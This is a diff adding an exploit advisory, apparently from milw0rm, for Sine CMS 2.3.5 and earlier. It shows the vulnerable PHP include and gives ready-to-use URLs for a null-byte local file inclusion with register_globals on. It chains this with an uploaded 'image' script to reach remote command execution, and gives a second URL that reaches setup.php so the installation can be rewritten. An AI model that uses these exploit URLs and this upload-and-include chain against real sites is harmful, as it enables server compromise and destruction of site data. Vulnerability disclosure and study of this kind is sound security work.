@@ -1,0 +1,89 @@
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |    ____            __________         __             ____  __      |
+ |  /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_     |
+ |   |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\    |
+ |   |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |      |
+ |   |___|___|  /\__|  /______  /\___  >__|            |___||__|      |
+ |            \/\______|      \/     \/                               |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |	Sine CMS Local File Inclusion / RCE (Register_globals: ON)    |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |			Version: <= 2.3.5                             |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |			Vendor: www.sinecms.net                       |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+ |			Discovered by: KiNgOfThEwOrLd                 |
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+				Intro:
+
+Sine cms is affected by a local file inclusion vulnerabily with 
+register_globals on.
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+				Related code:
+
+/mods/Integrated/index.php
+
+<?
+if ($_GET[page]=="source"){
+	include "mods/Integrated/source.php";
+} else {
+	// cerca la home e la themizza
+	include_once ("mods/".$sine[config][index_main]."/index.php");
+	$mods = $sine[config][index_main];
+}
+?>
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+				PoC:
+
+Usually, this is a correctly code, with no possible exploitation. But if 
+register_globals is ON, we can edit via GET the $sine[config][index_main] 
+value, and then, using null byte, we'll get a local file inclusion 
+vulnerability like:
+
+http://localhost/sinecms/mods/Integrated/index.php?sine[config][index_main]=
+{FILE_TO_INCLUDE}%00
+
+But pay attention, in this way the include_one function will try to include 
+"mods/{FILE}"; certainly, using the directory traversal var, we can surf and 
+include any files, but "mods/{FILE}" is different from "/mods/{FILE}"! In fact, 
+in this case, the script will try to include "/mods/Integrated/mods/{FILE}"! 
+So, the cms root path will be accessible with "../../../" and not "../../".
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+		How to get a Remote Command Execution
+
+Sine CMS, allows everybody to send a news with an image, uploadable directly 
+on the host. Then, uploading an evil script as an image, we'll get a shell in 
+/mods/Core/data/images/{EVIL_IMAGE}. Now, including that file by the local file 
+inclusion vulnerability that i've just explaned we'll get a remote command 
+execution.
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+				Exploit:
+
+http://localhost/sinecms/mods/Integrated/index.php?sine[config][index_main]=..
+/../Core/data/images/{EVIL}.jpg%00
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+			Just a little security issue
+
+Realted code:
+
+setup.php @ line 98
+
+[...]
+if(file_exists("./sine.lock")) $locked=1;
+[...]
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+				PoC:
+
+After the installation, sine cms makes a file (sine.lock), to check if the cms 
+has been already installed. But the condition is true if "./sine.lock" exist, 
+so only if there is sine.lock in the current work dir! Then, including via 
+local file inclusion "setup.php" the condition will result false, and we can 
+rewrite, delete, or edit the installation.
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+				Exploit:
+
+http://localhost/sinecms/mods/Integrated/index.php?sine[config][index_main]=..
+/../../setup.php%00
+[*]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[*]
+
+# milw0rm.com [2008-01-06]
